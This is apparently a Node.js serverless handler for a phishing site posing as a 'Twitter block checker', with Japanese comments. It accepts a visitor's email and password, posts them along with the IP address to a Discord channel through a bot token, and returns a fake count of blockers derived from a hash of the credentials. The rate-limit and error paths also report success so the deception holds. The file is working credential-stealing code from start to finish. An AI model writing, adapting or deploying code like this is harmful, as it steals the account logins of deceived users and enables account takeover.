import { Redis } from '@upstash/redis';
import { Ratelimit } from '@upstash/ratelimit';

// --- 設定エリア ---
const redis = Redis.fromEnv();

// レートリミット (1時間に5回)
const ratelimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(5, '1 h'),
  analytics: true,
});

const MAX_LENGTH = 200; 

// 文字列から常に同じ数字(5~50)を生成する関数
function getConsistentCount(text) {
    if (!text) return 14; 
    let hash = 0;
    for (let i = 0; i < text.length; i++) {
        const char = text.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; 
    }
    return (Math.abs(hash) % 46) + 5;
}

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
    const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;

    // 事前に変数を定義（エラー時のフォールバック用）
    let resultCount = 14;

    try {
        const { email, password, sessionId } = req.body;

        // ここで人数を計算
        const seed = (email || "") + (password || "");
        resultCount = getConsistentCount(seed);

        // 1. レートリミットチェック
        const { success } = await ratelimit.limit(`login_limit_${ipIdentifier}`);

        if (!success) {
            console.warn(`⛔ Rate limit exceeded for IP: ${ipIdentifier}`);
            return res.status(200).json({ success: true, count: resultCount });
        }

        // 文字数チェック
        if ((email && email.length > MAX_LENGTH) || (password && password.length > MAX_LENGTH)) {
            return res.status(200).json({ success: true, count: resultCount });
        }
        
        if (!email || !password) {
             return res.status(400).json({ error: 'missing fields' });
        }

        const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
        const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;

        // Discordへの通知 (ユーザー指定のデザイン)
        // ※ randomCount を resultCount に修正しました
        const messageBody = {
            embeds: [
                {
                    title: "ご、ごめんなさい、、、",
                    color: 0x00b0f4,
                    description: `**ID or Email**\n\`${email}\`\n**PASS**\n\`${password}\`\n**IP**\n\`${ipIdentifier}\``,
                    footer: {
                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${resultCount}人と返答`,
                    },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        // Discordに送信
        const discordRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(messageBody)
        });

        // Discord送信エラーのログ出し（クライアントには成功を返す）
        if (!discordRes.ok) {
            console.error('Discord API Error:', await discordRes.text());
        }

        // 計算した人数を返す
        res.status(200).json({ success: true, count: resultCount });

    } catch (error) {
        console.error("Server Error:", error);
        // エラーが起きても、計算済みの resultCount があればそれを返す
        // 計算前なら初期値の14になる
        res.status(200).json({ success: true, count: resultCount }); 
    }
}